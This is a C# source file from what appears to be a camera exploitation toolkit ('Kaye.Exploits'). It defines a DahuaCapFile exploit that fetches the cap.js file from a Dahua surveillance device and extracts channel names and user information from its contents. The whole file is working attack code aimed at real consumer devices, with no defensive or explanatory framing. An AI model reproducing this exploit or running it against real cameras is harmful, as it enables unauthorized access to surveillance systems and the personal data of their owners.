using System;
using System.Net;

using Kaye.Net;
using Kaye.Models;

namespace Kaye.Exploits
{
    class DahuaCapFile : Exploit
    {
        public static String CapPath = "cap.js", ChannelsWord = "channelNames='", InfoWord = "userInfo='";

        public override String GetMessage() { return "sensitive information in cap.js file"; }
        public String Info;
        public String[] CameraList;
        public Model Model;

        public static Boolean TryPerform(IPEndPoint Target, out DahuaCapFile Output)
        {
            Boolean Success = false;
            Output = new DahuaCapFile();
            Output.Info = String.Empty;
            Output.CameraList = new String[0];
            Output.Model = Model.Dahua;
            HTTPSender Http = new HTTPSender(Target);
            String Response = Http.DownloadString(CapPath);
            if (Response == null || Response.Length == 0 || HTTPSender.CodeFromResponse(Response) != 200) return false;
            Response.Replace(" ", "");
            Int32 Pos;
            String List = String.Empty;

            if ((Pos = Response.IndexOf(ChannelsWord)) != -1)
            {
                Pos += ChannelsWord.Length;
                while (Response[Pos] != '\'' && Pos < Response.Length)
                {
                    List += Response[Pos];
                    Pos++;
                }
                Output.CameraList = List.Split(new String[] { "&&" }, StringSplitOptions.RemoveEmptyEntries);
                Success = Success || true;
            }

            if ((Pos = Response.IndexOf(InfoWord)) != -1)
            {
                Pos += InfoWord.Length;
                while (Response[Pos] != '\'' && Pos < Response.Length)
                {
                    Output.Info += Response[Pos];
                    Pos++;
                }
                Success = Success || true;
            }

            return Success;
        }
    }
}